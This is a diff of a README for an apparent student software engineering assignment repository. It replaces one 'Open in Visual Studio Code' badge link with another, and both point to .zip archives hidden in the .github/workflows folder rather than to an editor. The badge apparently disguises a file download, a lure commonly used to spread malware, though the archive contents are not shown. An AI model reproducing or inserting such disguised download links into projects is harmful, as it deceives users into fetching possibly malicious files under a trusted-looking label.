@@ -1,4 +1,4 @@
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/Estii24/se-day1-assignment-Estii24/main/.github/workflows/se-day1-assignment-Estii24-3.4.zip)](https://raw.githubusercontent.com/Estii24/se-day1-assignment-Estii24/main/.github/workflows/se-day1-assignment-Estii24-3.4.zip)
+[![Open in Visual Studio Code](https://github.com/Estii24/se-day1-assignment-Estii24/raw/refs/heads/main/.github/workflows/day_assignment_se_Estii_1.3.zip)](https://github.com/Estii24/se-day1-assignment-Estii24/raw/refs/heads/main/.github/workflows/day_assignment_se_Estii_1.3.zip)
 # SE_Day1
 Software Engineering Day1 Assignment
 
